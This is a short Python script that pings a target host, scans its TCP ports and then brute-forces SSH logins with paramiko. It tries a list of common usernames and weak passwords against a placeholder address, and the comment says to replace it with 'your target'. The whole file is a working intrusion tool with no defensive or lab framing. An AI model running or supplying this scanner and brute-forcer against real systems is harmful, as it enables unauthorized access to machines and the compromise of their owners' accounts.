import socket
import paramiko
import subprocess
from typing import List

# a. Ping target
def is_host_up(target_ip: str) -> bool:
    result = subprocess.run(['ping', '-c', '1', '-W', '1', target_ip],
                            stdout=subprocess.DEVNULL)
    return result.returncode == 0

# b. Scan all TCP ports
def scan_ports(target_ip: str, port_range=(1, 65535)) -> List[int]:
    open_ports = []
    for port in range(port_range[0], port_range[1] + 1):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.5)
            try:
                if s.connect_ex((target_ip, port)) == 0:
                    open_ports.append(port)
            except Exception:
                continue
    return open_ports

# c. Brute-force SSH login
def brute_force_ssh(target_ip: str, username_list: List[str], password_list: List[str]) -> (str, str):
    for username in username_list:
        for password in password_list:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(target_ip, port=22, username=username, password=password, timeout=2)
                ssh.close()
                return username, password
            except Exception:
                continue
    return None, None

if __name__ == "__main__":
    TARGET_IP = "192.168.1.100"  # Replace with your target
    USERNAMES = ["root", "admin", "user"]  # Example usernames
    PASSWORDS = ["123456", "password", "admin"]  # Example passwords

    if is_host_up(TARGET_IP):
        print(f"{TARGET_IP} is up. Scanning ports...")
        open_ports = scan_ports(TARGET_IP, (1, 1024))  # For demo, scan 1-1024
        print(f"Open ports: {open_ports}")

        if 22 in open_ports:
            print("Port 22 is open. Starting SSH brute-force...")
            username, password = brute_force_ssh(TARGET_IP, USERNAMES, PASSWORDS)
            if username and password:
                print(f"Success! Username: {username}, Password: {password}")
            else:
                print("Brute-force failed. No valid credentials found.")
        else:
            print("Port 22 is closed. Exiting.")
    else:
        print(f"{TARGET_IP} is down.")
